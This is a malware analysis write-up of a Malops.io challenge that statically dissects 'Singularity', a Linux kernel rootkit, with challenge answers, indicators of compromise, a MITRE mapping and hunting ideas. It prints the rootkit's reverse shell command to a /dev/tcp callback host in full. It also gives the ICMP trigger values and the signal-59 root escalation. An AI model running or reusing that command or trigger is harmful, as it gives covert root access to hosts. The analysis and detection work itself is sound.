---
title: Singularity - Malops.io ELF Binary Analysis
date: 2026-10-17
categories: [analysis, security, malware, lab]
tags: [analysis, security, lab]
---

## Overview

This write-up covers the **Singularity** challenge from [Malops.io](https://malops.io). Although the sample presents as a 64-bit ELF, it is not a userland binary. It is a **Linux loadable kernel module (LKM) rootkit** that hooks kernel functions with ftrace, hides itself and its activity, and provides a covert remote access path. The path is triggered by a crafted ICMP echo request from the operator's host. The trigger starts a reverse shell that connects back over TCP 443, runs under a disguised process name, is escalated to root, and is hidden from process listings by the rootkit.

Analysis was **static only**, using `strings` and Binary Ninja (decompiler, Strings and Symbols views). All behavior described below is derived from decompiled code and strings, and should be treated as theory until confirmed in a lab. Confidence levels are noted where an interpretation depends on inferred structure offsets or byte order.

**Key findings at a glance:**

- **Trigger:** ICMP echo request (type 8) from `192.168.5.128` with sequence number **1999** (wire value `0x07cf`).
- **Action:** `spawn_revshell` launches `setsid /bin/bash -c "..."` through the kernel usermodehelper.
- **Callback:** reverse shell to `192.168.5.128:443`, plaintext via bash `/dev/tcp`.
- **Disguise:** the shell runs as `firefox-updater` (`exec -a`).
- **Privilege escalation:** signal **59** handled by `hook_kill` grants root and hides the target PID. The shell sends this signal to itself on launch.
- **Evasion:** hides the module, up to **32** PIDs, TCP connections involving port **18081** and the C2 IP, and clears the kernel taint flag using a hidden kernel thread named **`zer0t`**.

## Static Analysis

### Sample Fingerprint

| Attribute | Value | Confidence |
|---|---|---|
| Type | Relocatable ELF kernel module (`.ko`, ET_REL) | High |
| Architecture | x86-64 | High |
| Size | 4.96 MiB (inflated by DWARF debug information) | High |
| Entropy | 4.61771 (not packed) | High |
| Compiler | GCC 12.2.0, Debian 12 | High |
| Kernel target | 6.12.32-amd64 (`vermagic`) | High |
| Module name | `singularity` | High |
| Author metadata | MatheuZSecurity, ByteKick | High |
| Build path | `/home/profzzor/Desktop/Singularity/modules/*.c` | High |
| SHA256 | `0b8ecdaccf492000f3143fa209481eb9db8c0a29da2b79ff5b7f6e84bb3ac7c8` | High |
| Likely origin | Public open-source "Singularity" rootkit, locally compiled | Medium |

The sample was identified with **Detect It Easy (DiE)**. The first strings dump showed `.modinfo` fields, `vermagic`, `__this_module`, the `init_module` and `cleanup_module` symbols, and thousands of DWARF type names. These are properties of a kernel object, and the embedded DWARF data explains both the large file size and the low entropy. The embedded build path and author metadata suggest the sample is a locally compiled build of a public project, so a hash match against the public source is unlikely.

### Analysis Method

Standard capa, FLOSS, and PE-oriented tooling is of limited value against a kernel object, so the approach was adapted:

1. Pull `strings` output and group it by theme (module metadata, hook names, source paths, indicators).
2. Use hook and function names as pivots in Binary Ninja, starting at `init_module` and working outward.
3. Read the decompiled code to confirm or reject each hypothesis, and record how each answer was reached.
4. Note caveats wherever field offsets or byte order were inferred rather than verified.

### Strings Review

A first pass over the strings surfaced several high-value indicators that guided the rest of the analysis:

- `init_module`, the symbol the kernel loader looks for when a module is inserted
- `module_is_hidden`, a state variable related to self-hiding
- `kobject_del` and `kobject_put`, kernel APIs used to unlink objects from sysfs
- `hook_icmp_rcv` and `orig_icmp_rcv`, pointing to an ICMP receive hook
- `prepare_creds` and `commit_creds`, the kernel APIs used to modify process credentials
- `fh_install_hook`, `fh_resolve_hook_address`, `ftrace_set_filter_ip`, `register_ftrace_function`, `register_kprobe`, and `unregister_kprobe`, indicating an ftrace based hooking framework

Taken together, these strings already outline a rootkit with self-hiding, ICMP-based communication, and credential manipulation capabilities.

### Module Entry Point: `init_module`

The function at `0x4052b0` is labeled `init_module`. This is the symbol the kernel loader executes when the module is inserted, and the decompile shows it calling every feature setup routine. No alias such as `singularity_init` was observed. Counting the calls made after the `fentry()` prologue and before the return reveals **15 distinct feature-initialization functions**, with `module_hide_current` counted as the fifteenth:

| # | Function | Role (inferred from name unless noted) |
|---|---|---|
| 1 | `reset_tainted_init` | Taint flag reset and the `zer0t` thread (verified) |
| 2 | `hiding_open_init` | File hiding hooks |
| 3 | `become_root_init` | Privilege escalation hooks, 10 hooks (verified count) |
| 4 | `hiding_directory_init` | Directory listing hiding |
| 5 | `hiding_stat_init` | Stat hiding |
| 6 | `hiding_tcp_init` | TCP connection hiding, 3 hooks (verified) |
| 7 | `hooking_insmod_init` | Module loading control |
| 8 | `clear_taint_dmesg_init` | Taint and dmesg scrubbing |
| 9 | `hooks_write_init` | Write-path hooks |
| 10 | `hiding_chdir_init` | `chdir` hiding |
| 11 | `hiding_readlink_init` | `readlink` hiding |
| 12 | `bpf_hook_init` | `bpf` syscall hook |
| 13 | `hiding_icmp_init` | ICMP trigger hook (verified) |
| 14 | `trace_pid_init` | PID tracking |
| 15 | `module_hide_current` | Module self-hiding (verified), called last |

This modular layout is typical of a rootkit designed so that individual features can be enabled, removed, or swapped independently. Because `module_hide_current` is called last, the module only conceals itself after every hook is installed.

### Hook Mechanism

The module installs its hooks with **ftrace**, and resolves function addresses through a **kprobe on `kallsyms_lookup_name`** (confidence: High). `reset_tainted_init` demonstrates the technique: it registers a kprobe, reads the resolved address, unregisters the kprobe, and then calls the returned function with the symbol name `"tainted_mask"`. The common installer is `fh_install_hooks(&hooks, count)`, which each feature module uses to register its own hook table.

**Why this matters:** resolving `kallsyms_lookup_name` through a kprobe is a well known workaround for kernels that no longer export that symbol. It also means the hooks live in ftrace data structures, which gives defenders a place to look (see the detection section).

## Defense Evasion and Anti-Forensics

### Self-Hiding: `module_hide_current`

The last statement executed in `init_module` is `module_hide_current()` at `0x40531c`. Several details of its logic were recovered:

- **Run-once guard:** the function begins with `if (data_4144d0 != 0) return` and ends by writing `data_4144d0 = 1`. A flag checked at entry and set at exit ensures the hiding logic executes only once. This variable most likely corresponds to the `module_is_hidden` string found earlier.
- **sysfs removal:** when the saved parent pointer is non-null, the function calls `kobject_del(0x40fcc0)`, clears pointers, and calls `kobject_put` on another field. `kobject_del` removes a kobject's entry from sysfs, so `/sys/module/singularity` is expected to disappear.
- **Module list removal:** a manual `list_del` unlinks the module from the kernel module list, after which the list pointers are overwritten with junk values (`0x22373717` and the ASCII bytes `"1777"`). The purpose of the junk values is unclear and is worth investigating.
- **State tampering:** the write `__this_module = 3` sets the module state field, probably to `MODULE_STATE_UNFORMED` (confidence: Medium).
- **Unhide path:** state saved before the changes (`saved_list_pos` and `saved_parent`) suggests the module contains logic to restore itself to the lists, though the consumer of those variables was not located.

**Expected effect:** `lsmod`, `/proc/modules`, and `/sys/module/singularity` show nothing, and `rmmod singularity` likely fails because the module can no longer be found by name. Detection must therefore rely on memory forensics or kernel-level integrity checks rather than standard userland tooling.

### Anti-Forensics Thread: `zer0t`

The `reset_tainted_init` routine creates a kernel thread using:

```c
kthread_create_on_node(singularity_exit, 0, 0xffffffff, "zer0t")
```

The thread name is the final argument, giving the hardcoded name **`zer0t`**. The thread is started with `wake_up_process`, and the code then reads the new task's PID and passes it to `add_hidden_pid(pid)`, so the rootkit hides its own worker thread. The PID is read from offset `0x980`, which is assessed to be the `pid` field of the `task_struct`. This offset was not verified against the target kernel's structure layout.

A `taint_mask_ptr` to the kernel's `tainted_mask` is resolved through the kprobe technique described above, which indicates the thread's purpose is to **clear the kernel taint flag** (confidence: High on the thread, Medium on its exact behavior, since the thread body was not read). Loading an out-of-tree or unsigned module normally taints the kernel, and that flag is a common artifact responders check. Clearing it removes an easy indicator. If the kprobe or symbol lookup fails, no thread is created.

> **Analyst note:** Binary Ninja labels the thread entry point `singularity_exit`, which is an unusual name for a function that appears to clear a taint flag. This should be checked when the thread body is reviewed.

### Hidden PID Table: `add_hidden_pid`

The `add_hidden_pid` function maintains a fixed-size list of PIDs that the rootkit conceals. The only bounds check is:

```c
else if (hidden_count_1 != 32)
```

This sits on the path taken after a duplicate scan finds no existing match. If `hidden_count` is already **32**, the function returns without storing anything. Otherwise the PID is stored via `hidden_pids[hidden_count] = pid` and the counter increments.

- **Maximum hidden PIDs:** 32 (`0x20`)
- **Array element size:** `hidden_pids` is an `int32_t` array (4-byte stride, from the `<< 2` indexing), so a full table occupies 128 bytes. The declared array size was not observed, but a 32-entry cap implies the array is sized to match.
- **No removal routine:** none was seen, so entries appear to be permanent.

**Why this matters:** the cap is a reliability limit as well as a design choice. Each triggered reverse shell consumes up to two slots (the shell and its `setsid` wrapper), and the `zer0t` thread consumes another. Repeated triggers could therefore fill the table and leave later shells visible (confidence: Medium).

### Network Concealment: TCP Hiding

`hiding_tcp_init` installs **3 hooks** through `fh_install_hooks(&new_hooks, 3)`. Two of them are the `seq_show` handlers (`hooked_tcp4_seq_show` and `hooked_tcp6_seq_show`) that generate `/proc/net/tcp` and `/proc/net/tcp6`, the sources used by tools such as `netstat`. The third is probably `hooked_tpacket_rcv`, which was not read.

In both `seq_show` hooks, two socket fields (offsets `0xc` and `0x31e`) are compared against the constant `0xa146`:

```c
*(v + 0xc)   != 0xa146
*(v + 0x31e) != 0xa146
```

**Byte order and decoding:**

1. Offset `0xc` in a `sock_common` structure is assessed to be `skc_dport`, based on the standard kernel layout. This was recalled from the structure definition and not verified in the decompiler.
2. Ports in kernel socket structures are stored in network byte order, so the constant is byte-swapped relative to the value the author wrote.
3. Swapping `0xa146` gives `0x46a1`.
4. Converting to decimal: `0x46a1 = (4 x 4096) + (6 x 256) + (10 x 16) + 1 =` **18081**.
5. If the value were not byte-swapped it would be 41286, but the swapped interpretation is consistent with how ports are stored.

Checking two fields suggests the rootkit hides connections where **either** the source or the destination port is 18081. Two further behaviors were observed:

- The IPv4 hook also compares two address fields against `in_aton("192.168.5.128")`, so **connections involving the C2 IP are hidden as well**.
- The IPv6 hook compares address words against a pattern matching `::1`, so IPv6 loopback appears to be hidden (inferred).

> **Analyst note:** the callback port 443 is not itself the hidden port. The connection from the reverse shell is concealed by the C2 IP filter instead. This means an analyst looking at `/proc/net/tcp` on an infected host will not see the C2 session, and a comparison against `ss` output from a clean source or a packet capture is needed to reveal it.

## Privilege Escalation

The `become_root_init` routine calls `fh_install_hooks(&hooks, count: 0xa)`, so **10 hooks** are installed in total (the hexadecimal count `0xa` converts to 10). Following the data references from the `&hooks` table leads to two entries, `hook_kill` and `orig_kill`, which identify a hooked `kill` syscall handler.

Inside `hook_kill`, the rootkit checks the signal number (`regs->si`):

- **Signal 59 (`0x3b`):** the hook calls `prepare_creds()`, zeroes 0x20 bytes at offset 8 of the new credential structure (most likely the eight uid and gid fields), calls `commit_creds()`, and then calls `add_hidden_pid(pid)`. The original `kill` is **not** called. The caller becomes root and the target PID is hidden (confidence: High on behavior, Medium on the exact credential fields).
- **Signal 0:** when the target PID is in `hidden_pids`, the hook returns early, so hidden PIDs likely appear nonexistent to `kill(pid, 0)` probes, which is a common way for tools to test whether a process exists.

Following cross-references to `prepare_creds` also leads to `hook_getuid()`, which contains a hardcoded **magic word**, found in the string `MAGIC=babyelephant`:

> **`babyelephant`**

**Hypothesis (Medium):** because the escalation is triggered by the signal number, any local process able to run `kill -59 <pid>` may be able to become root. This was not tested and should be validated in a lab.

## Backdoor Trigger and Command and Control

### Trigger Mechanism: ICMP

The `init_module` call list includes `hiding_icmp_init()`, and the strings included `hook_icmp_rcv` and `orig_icmp_rcv`. This indicated that the rootkit hooks the **ICMP** receive path, so `hook_icmp_rcv` was decompiled to inspect the trigger logic. The hook evaluates the following conditions:

| Check | Decompiled expression | Meaning |
|---|---|---|
| IP protocol | `(rax_3 + 9) == 1` | IP header protocol byte, value 1 is ICMP |
| Source address | parsed with `in4_pton` from the literal `"192.168.5.128"`, compared to `trigger_ip` | Packet must come from the operator's address |
| ICMP type | compared to `8` | Echo request (ping) |
| Sequence number | `(rdx_3 + 6) == 0xcf07` | 16-bit compare on the ICMP sequence field |

Only when **all** conditions are satisfied is the reverse shell queued. Requiring a specific source IP and sequence value makes accidental triggering from normal traffic extremely unlikely. Notably, the packet is **always forwarded** to `orig_icmp_rcv`, so the host still answers the ping normally and the trigger leaves no obvious gap in ICMP behavior.

### Decoding the Magic Sequence Number

`rdx_3` points at the ICMP header. Offset 6 is the sequence field (type at 0, code at 1, checksum at 2-3, identifier at 4-5, sequence at 6-7).

1. x86 reads a 16-bit field in little-endian order, so the constant `0xcf07` means the bytes in memory are `07 cf`.
2. ICMP stores the field in network (big-endian) order, so the on-the-wire value is `0x07cf`.
3. `0x07cf = (7 x 256) + 207 =` **1999**.

The author most likely wrote `htons(1999)`, which the compiler folded into the constant `0xcf07`. If the author had instead compared the raw value without a byte swap, the decimal would be 52999 (confidence: High on the conditions, Medium-High on the exact number). The value should be verified in a lab with a crafted packet.

### Execution: `spawn_revshell`

Once the checks pass, `hook_icmp_rcv` allocates a work structure and assigns `rax_9[3] = spawn_revshell`, which is the work callback slot. It then calls `queue_work_on(0x2000, *system_wq, ...)`, placing the job on the system workqueue. Deferring execution to a workqueue keeps the potentially blocking shell launch out of the network receive path.

`spawn_revshell` builds its command line with `snprintf`:

```bash
bash -c 'PID=$$; kill -59 $PID; exec -a "firefox-updater" /bin/bash &>/dev/tcp/192.168.5.128/443 0>&1' &
```

The argument vector is `/usr/bin/setsid /bin/bash -c <cmd>`, executed from kernel space through `call_usermodehelper_setup` and `call_usermodehelper_exec`.

**Reading the command as a chain:**

1. The launched shell records its own PID in `PID`.
2. It runs `kill -59 $PID`, sending signal 59 **to itself**. This is intercepted by `hook_kill`, which elevates the process to root and adds its PID to the hidden list.
3. It then replaces itself with `/bin/bash` using `exec -a "firefox-updater"`, with all input and output redirected to the C2 over `/dev/tcp`.

This connects the reverse shell to the privilege escalation hook, and shows that the rootkit delivers a **root shell** to the operator without any credentials.

Key characteristics:

- **C2 address:** `192.168.5.128`, also used as the trigger source filter and as the address hidden by the TCP hooks.
- **C2 port:** **443**. The format string is `.../dev/tcp/%s/%s`, and the port argument `data_405e3a` holds bytes `34 34 33 00`, which is ASCII `443` plus a null terminator.
- **Process masquerading:** `exec -a "firefox-updater"` sets `argv[0]` of the new process, so tools such as `ps` display `firefox-updater` instead of `bash`.
- **Session detachment:** `setsid` separates the shell from the helper's session so it survives independently.

> **Analyst note:** Port 443 suggests an attempt to blend in with HTTPS traffic, but `/dev/tcp` produces a raw, unencrypted TCP stream rather than a TLS session. The operator's listener must therefore be a plain TCP listener, and protocol-aware inspection that expects a TLS handshake on port 443 would flag the connection as anomalous.

### Cleanup Logic

Before launching the shell, the highest PID in the task list is recorded. After a 1.5 second sleep, `spawn_revshell` walks the task list again. For tasks with a higher PID whose name contains `firefox-updater` or `setsid` (matched with `strstr`), the function calls `add_hidden_pid`. The author therefore uses the same literal to **create** and to **find and hide** the shell process, which strongly supports `firefox-updater` as the intended process name and confirms the shell and its `setsid` wrapper are concealed from process listings shortly after launch. The field offsets used in this walk (`+0xd0`, `+0xd4`, and `+0x2f0`) were mapped from kernel layouts and should be confirmed in the `task_struct` type view.

## Additional Capabilities (Name and String Evidence Only)

Several `init_module` routines and strings suggest further capabilities that were **not decompiled** and are therefore lower confidence:

- **File and directory hiding:** `hiding_open_init`, `hiding_directory_init`, `hiding_stat_init`, `hiding_chdir_init`, and `hiding_readlink_init` suggest hooks across the common file access syscalls.
- **Log filtering:** strings referencing `kern.log`, `auth.log`, `syslog.1`, and `vmallocinfo` suggest filtering of log content (confidence: Medium, from strings only).
- **Write-path hooks:** `hooks_write_init` may protect hidden artifacts from modification (not read).
- **Module and BPF control:** `hooking_insmod_init` and `bpf_hook_init` may block competing modules or monitoring tools (confidence: Medium, from names only).
- **Unexplained strings:** `obliviate`, `z0nez3r0`, and `rootkitt` have no assigned role yet.

## Challenge Answers

| # | Question | Answer |
|---|---|---|
| 1 | SHA256 of the sample | `0b8ecdaccf492000f3143fa209481eb9db8c0a29da2b79ff5b7f6e84bb3ac7c8` |
| 2 | Primary initialization function | `init_module` |
| 3 | Feature-initialization calls in `init_module` | 15 |
| 4 | Anti-forensics kernel thread name | `zer0t` |
| 5 | Maximum hidden PIDs | 32 (`0x20`) |
| 6 | Last function called to hide the rootkit | `module_hide_current` |
| 7 | Hidden TCP port (decimal) | 18081 |
| 8 | Privilege escalation magic word | `babyelephant` |
| 9 | Hooks installed for privilege escalation | 10 |
| 10 | C2 IPv4 address | `192.168.5.128` |
| 11 | C2 port | 443 |
| 12 | Protocol hooked for the trigger | ICMP |
| 13 | Magic sequence number (decimal) | 1999 |
| 14 | Function queued to run the reverse shell | `spawn_revshell` |
| 15 | Reverse shell process name | `firefox-updater` |

## Assessment

Singularity is a modular Linux kernel rootkit that combines self-concealment, privilege escalation, and a covert, network-triggered remote access channel. Its design shows several deliberate choices aimed at evading both administrators and responders:

- **Layered hiding:** the module removes itself from the module list and sysfs, hides its worker thread, hides its reverse shell processes, and filters the operator's connections out of `/proc/net/tcp*`.
- **Authenticated activation:** the backdoor requires a specific source IP, ICMP type, and sequence number, which limits accidental discovery.
- **Integrated root shell:** the launched shell elevates itself through the hooked `kill` syscall, so the operator receives root access without credentials.
- **Stealthy transport:** ICMP triggering avoids any listening socket on the host, so a port scan will not reveal the backdoor.
- **Masquerading:** the `firefox-updater` name is chosen to look benign in process listings.
- **Indicator removal:** clearing the taint flag removes a common sign that an unsigned module was loaded.

### Hypothesis Summary

| # | Hypothesis | Confidence | Status |
|---|---|---|---|
| 1 | Linux LKM rootkit, ftrace and kprobe based | High | Confirmed in code |
| 2 | ICMP echo (sequence 1999) from 192.168.5.128 triggers a reverse shell | High, Medium-High on sequence | Confirmed in code, lab test pending |
| 3 | Reverse shell to 192.168.5.128:443 as `firefox-updater` | High | Confirmed in code |
| 4 | Signal 59 grants root and hides a PID | High | Confirmed in code |
| 5 | Local users could use `kill -59` for privilege escalation | Medium | Untested |
| 6 | Hides up to 32 PIDs | High | Confirmed in code |
| 7 | Hides TCP port 18081 and the C2 IP | Medium-High | Confirmed in code, offsets inferred |
| 8 | `zer0t` thread clears the kernel taint flag | Medium | Thread body not read |
| 9 | Module removed from module list and sysfs | High | Confirmed in code |
| 10 | Log filtering of `kern.log`, `auth.log`, `syslog.1`, `vmallocinfo` | Medium | From strings only |
| 11 | Write-path hooks protect hidden artifacts | Unknown | Not decompiled |
| 12 | `insmod` and BPF hooks block competing modules or tools | Medium | From names only |

### Indicators of Compromise

**Network**

| Type | Value |
|---|---|
| C2 and trigger IP | `192.168.5.128` (RFC 1918, probably a lab placeholder) |
| Callback | TCP 443, plaintext shell |
| Trigger | ICMP echo request from the C2 IP with sequence number 1999 |
| Hidden port | TCP 18081 (source or destination) |

**Host**

| Type | Value |
|---|---|
| SHA256 | `0b8ecdaccf492000f3143fa209481eb9db8c0a29da2b79ff5b7f6e84bb3ac7c8` |
| Process name | `firefox-updater` (child of `setsid`, running `bash`) |
| Kernel thread | `zer0t` |
| Command line | `bash -c 'PID=$$; kill -59 $PID; exec -a "firefox-updater" /bin/bash &>/dev/tcp/192.168.5.128/443 0>&1' &` |
| Module name | `singularity` (hidden after load) |
| Signal | `kill -59` |

**Strings**

| Type | Value |
|---|---|
| Magic word | `babyelephant`, `MAGIC=babyelephant` |
| Other strings | `obliviate`, `z0nez3r0`, `rootkitt` |
| Build path | `/home/profzzor/Desktop/Singularity/` |
| Author metadata | `MatheuZSecurity`, `ByteKick` |

### MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|---|---|---|
| Boot or Logon Autostart: Kernel Modules and Extensions | T1547.006 | Loadable kernel module with `init_module` |
| Rootkit | T1014 | Syscall and `/proc` hooks, module and PID hiding |
| Hide Artifacts | T1564 | Hidden PIDs, hidden TCP port and C2 IP, sysfs and module list removal |
| Masquerading: Match Legitimate Name or Location | T1036.005 | `firefox-updater` process name |
| Traffic Signaling | T1205 | ICMP echo request with magic sequence number |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | `bash` reverse shell via `/dev/tcp` |
| Abuse Elevation Control Mechanism | T1548 | Signal 59 handled by `hook_kill`, `commit_creds` |
| Indicator Removal | T1070 | Kernel taint flag clearing (Medium confidence) |

### Detection and Hunting Ideas

- **Network correlation:** alert on inbound ICMP echo with sequence number 1999 followed by outbound TCP 443 to the same host, and on port 443 connections that never complete a TLS handshake.
- **Ftrace and symbol integrity:** compare ftrace hook lists (`enabled_functions`) and `kallsyms` against expected values.
- **Memory forensics:** compare kernel module lists from memory against sysfs and `/proc/modules` to expose modules unlinked from userland views.
- **Clean-source comparison:** compare `/proc/net/tcp` output with a packet capture or with `ss` output from a clean source, since the rootkit filters the proc files.
- **Host hunting:** look for processes named `firefox-updater` whose executable is `/bin/bash`, a kernel thread named `zer0t`, and `kill -59` activity.
- **Integrity checks:** inspect syscall and `seq_show` function pointers for redirection outside the core kernel text.